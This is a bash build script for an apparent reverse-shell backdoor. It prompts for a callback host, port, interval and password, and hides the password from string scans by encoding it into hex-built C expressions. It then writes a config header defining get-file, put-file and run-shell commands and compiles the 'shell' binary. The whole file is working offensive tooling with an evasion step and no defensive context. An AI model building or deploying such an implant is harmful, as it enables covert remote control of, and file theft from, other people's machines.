#!/bin/bash

function read_input {
	RET=""

	if [ -z $2 ]; then
		HIT="$1: "
	else
		HIT="$1 (default: $2): "
	fi

	echo -n "$HIT"; read

	if [ -z $REPLY ]; then
		RET=$2
	else
		RET=$REPLY
	fi
}

function string_obfuscate {
	n=0
	VAR=""
	RETVAL="" 

	for i in $(echo -ne "$1" | hexdump -ve '"%08x\n"'); do
		VAR+=" p[$n] = 0x$i; \\
"
		((n++))	
	done

	RETVAL+="\\
({ \\
unsigned int *p = (unsigned int*)__builtin_alloca($(( (n*4)+1 ))); \\
$VAR p[$n] = 0x00; \\
 (char *)p; \\
})
"
}

function config_gen {
	read_input "Reverse Host"
	HOST=$RET

	read_input "Reverse Port" "80"
	PORT=$RET

	read_input "Interval (in seconds)" "500"
	INTERVAL=$RET

	read_input "Password" "s3cr3t"
	PASS=$RET

	echo -e "Reverse Host: \e[01;36m$HOST\e[00m"
	echo -e "Reverse Port: \e[01;36m$PORT\e[00m"
	echo -e "Interval: \e[01;36m$INTERVAL\e[00m"
	echo -e "Password: \e[01;36m$PASS\e[00m"

	string_obfuscate $PASS
	PASS=$RETVAL

	cat > src/config.h <<EOF
#ifndef _CONFIG_H
#define _CONFIG_H

#define HOST            "$HOST"
#define PORT            $PORT
#define INTERVAL        $INTERVAL
#define PASS 		$PASS
#define HOMEDIR 	"/"

#define ERROR		-1
#define GET_FILE	 1
#define PUT_FILE	 2
#define RUNSHELL	 3

#endif
EOF
	echo -e "\e[01;36mDONE!\e[00m"
}

function build_shell {
	cd src
	make clean
	make shell
	mv shell ../
}

config_gen
build_shell
